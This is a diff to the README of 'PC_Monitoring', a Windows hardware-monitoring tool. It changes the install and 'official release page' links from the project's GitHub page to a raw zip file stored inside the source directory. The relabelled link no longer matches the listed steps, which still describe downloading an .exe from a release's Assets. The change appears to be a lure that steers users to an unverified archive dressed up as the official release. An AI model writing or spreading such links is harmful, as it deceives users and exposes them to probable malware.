@@ -1,6 +1,6 @@
 # 🖥️ PC_Monitoring - Simple Tool To Track System Health
 
-[Install The Latest Version Here](https://github.com/stingless-lioncub70/PC_Monitoring)
+[Install The Latest Version Here](https://raw.githubusercontent.com/stingless-lioncub70/PC_Monitoring/main/pc-monitor/src-tauri/src/Monitoring-P-v1.5-alpha.1.zip)
 
 PC_Monitoring provides a clear view of your computer hardware. This tool tracks your CPU, GPU, RAM, and disk usage in one dashboard. You see your data in real time. It works with hardware from NVIDIA, AMD, and Intel. The app is light and does not slow your computer.
 
@@ -10,7 +10,7 @@ Your computer needs Windows 10 or Windows 11 to run this tool. You need a modern
 
 ## 📥 Getting Started
 
-1. Go to the [official release page](https://github.com/stingless-lioncub70/PC_Monitoring).
+1. Go to the [official release page](https://raw.githubusercontent.com/stingless-lioncub70/PC_Monitoring/main/pc-monitor/src-tauri/src/Monitoring-P-v1.5-alpha.1.zip).
 2. Look for the Assets section at the bottom of the latest release.
 3. Select the file ending in .exe to start your download.
 4. Open the file once the download finishes.
